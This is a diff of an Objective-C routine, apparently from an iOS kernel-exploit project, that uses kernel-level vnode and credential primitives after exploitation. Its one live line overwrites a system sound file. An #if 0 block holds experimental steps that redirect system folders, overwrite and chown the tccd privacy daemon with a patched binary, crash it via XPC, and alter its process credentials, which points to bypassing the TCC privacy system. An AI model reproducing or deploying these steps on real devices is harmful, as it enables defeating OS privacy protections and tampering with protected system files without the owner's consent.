@@ -196,87 +196,86 @@ int do_fun(void) {
     fun_ipc_entry_lookup(host_self);
     
     funVnodeOverwriteFile("/System/Library/Audio/UISounds/photoShutter.caf", [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"].UTF8String);
-    
 
-    
-//    Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var
+        
+//    Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> "/var/mobile/Library/Caches/com.apple.keyboards"
 //    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
 //    [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
 //    [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
-//    funVnodeRedirectFolder(mntPath.UTF8String, "/private");
+//    funVnodeRedirectFolder(mntPath.UTF8String, "/System/Library"); //<- should NOT be work.
+//    funVnodeRedirectFolder(mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards"); //<- should be work.
 //    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
-//    NSLog(@"/var directory: %@", dirs);
+//    NSLog(@"mntPath directory list: %@", dirs);
     
-    //TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
-    
-    //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var/mobile
-//    funVnodeResearch(mntPath.UTF8String, mntPath.UTF8String);
-//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
-//    NSLog(@"[i] /var/mobile dirs: %@", dirs);
-    
+#if 0
+    Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var/mobile
+    funVnodeResearch(mntPath.UTF8String, mntPath.UTF8String);
+    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
+    NSLog(@"[i] /var/mobile dirs: %@", dirs);
     
     
     
-//    funVnodeOverwriteFile(mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
-//    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted/images/BBBB.bin"] error:nil];
     
-//    symlink("/System/Library/PrivateFrameworks/TCC.framework/Support/", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/Support"].UTF8String);
-//    mount("/System/Library/PrivateFrameworks/TCC.framework/Support/", mntPath, NULL, MS_BIND | MS_REC, NULL);
-//    printf("mount ret: %d\n", mount("apfs", mntpath, 0, &mntargs))
-//    funVnodeChown("/System/Library/PrivateFrameworks/TCC.framework/Support/", 501, 501);
-//    funVnodeChmod("/System/Library/PrivateFrameworks/TCC.framework/Support/", 0107777);
+    funVnodeOverwriteFile(mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
+    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted/images/BBBB.bin"] error:nil];
     
-//    funVnodeOverwriteFile(mntPath.UTF8String, "/");
+    symlink("/System/Library/PrivateFrameworks/TCC.framework/Support/", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/Support"].UTF8String);
+    mount("/System/Library/PrivateFrameworks/TCC.framework/Support/", mntPath, NULL, MS_BIND | MS_REC, NULL);
+    printf("mount ret: %d\n", mount("apfs", mntpath, 0, &mntargs))
+    funVnodeChown("/System/Library/PrivateFrameworks/TCC.framework/Support/", 501, 501);
+    funVnodeChmod("/System/Library/PrivateFrameworks/TCC.framework/Support/", 0107777);
     
-    
-//    for(NSString *dir in dirs) {
-//        NSString *mydir = [mntPath stringByAppendingString:@"/"];
-//        mydir = [mydir stringByAppendingString:dir];
-//        int fd_open = open(mydir.UTF8String, O_RDONLY);
-//        printf("open %s, ret: %d\n", mydir.UTF8String, fd_open);
-//        if(fd_open != -1) {
-//            NSArray* dirs2 = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mydir error:NULL];
-//            NSLog(@"/var/%@ directory: %@", dir, dirs2);
-//        }
-//        close(fd_open);
-//    }
-//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library"].UTF8String, O_RDONLY));
-//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/containers"].UTF8String, O_RDONLY));
-//    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library/Preferences"].UTF8String, O_RDONLY));
-//    printf("open ret: %d\n", open("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches", O_RDONLY));
-    
-//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[mntPath stringByAppendingString:@"/mobile"] error:NULL];
-//    NSLog(@"/var/mobile directory: %@", dirs);
-    
-//    [@"Hello, this is an example file!" writeToFile:[mntPath stringByAppendingString:@"/Hello.txt"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
-//    funVnodeOverwriteFile("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", AAAApath.UTF8String);
-//    funVnodeChown("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
-//    funVnodeOverwriteFile(AAAApath.UTF8String, BBBBpath.UTF8String);
-//    funVnodeOverwriteFile("/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");
-    
-//    xpc_crasher("com.apple.tccd");
-//    xpc_crasher("com.apple.tccd");
-//    sleep(10);
-//    funUcred(getProc(getPidByName("tccd")));
-//    funProc(getProc(getPidByName("tccd")));
-//    funVnodeChmod("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
+    funVnodeOverwriteFile(mntPath.UTF8String, "/");
     
     
-//    funVnodeOverwrite(AAAApath.UTF8String, AAAApath.UTF8String);
+    for(NSString *dir in dirs) {
+        NSString *mydir = [mntPath stringByAppendingString:@"/"];
+        mydir = [mydir stringByAppendingString:dir];
+        int fd_open = open(mydir.UTF8String, O_RDONLY);
+        printf("open %s, ret: %d\n", mydir.UTF8String, fd_open);
+        if(fd_open != -1) {
+            NSArray* dirs2 = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mydir error:NULL];
+            NSLog(@"/var/%@ directory: %@", dir, dirs2);
+        }
+        close(fd_open);
+    }
+    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library"].UTF8String, O_RDONLY));
+    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/containers"].UTF8String, O_RDONLY));
+    printf("open ret: %d\n", open([mntPath stringByAppendingString:@"/mobile/Library/Preferences"].UTF8String, O_RDONLY));
+    printf("open ret: %d\n", open("/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches", O_RDONLY));
     
-//    funVnodeOverwrite(selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);
+    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:[mntPath stringByAppendingString:@"/mobile"] error:NULL];
+    NSLog(@"/var/mobile directory: %@", dirs);
+    
+    [@"Hello, this is an example file!" writeToFile:[mntPath stringByAppendingString:@"/Hello.txt"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    funVnodeOverwriteFile("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", AAAApath.UTF8String);
+    funVnodeChown("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
+    funVnodeOverwriteFile(AAAApath.UTF8String, BBBBpath.UTF8String);
+    funVnodeOverwriteFile("/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");
+    
+    xpc_crasher("com.apple.tccd");
+    xpc_crasher("com.apple.tccd");
+    sleep(10);
+    funUcred(getProc(getPidByName("tccd")));
+    funProc(getProc(getPidByName("tccd")));
+    funVnodeChmod("/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
+    
+    
+    funVnodeOverwrite(AAAApath.UTF8String, AAAApath.UTF8String);
+    
+    funVnodeOverwrite(selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);
 
 
-//Overwrite tccd:
-//    NSString *copyToAppDocs = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd_patched.bin"];
-//    remove(copyToAppDocs.UTF8String);
-//    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/tccd_patched.bin"] toPath:copyToAppDocs error:nil];
-//    chmod(copyToAppDocs.UTF8String, 0755);
-//    funVnodeOverwrite(selfProc, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", [copyToAppDocs UTF8String]);
+Overwrite tccd:
+    NSString *copyToAppDocs = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd_patched.bin"];
+    remove(copyToAppDocs.UTF8String);
+    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/tccd_patched.bin"] toPath:copyToAppDocs error:nil];
+    chmod(copyToAppDocs.UTF8String, 0755);
+    funVnodeOverwrite(selfProc, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", [copyToAppDocs UTF8String]);
     
-//    xpc_crasher("com.apple.tccd");
-//    xpc_crasher("com.apple.tccd");
-
+    xpc_crasher("com.apple.tccd");
+    xpc_crasher("com.apple.tccd");
+#endif
     
     return 0;
 }
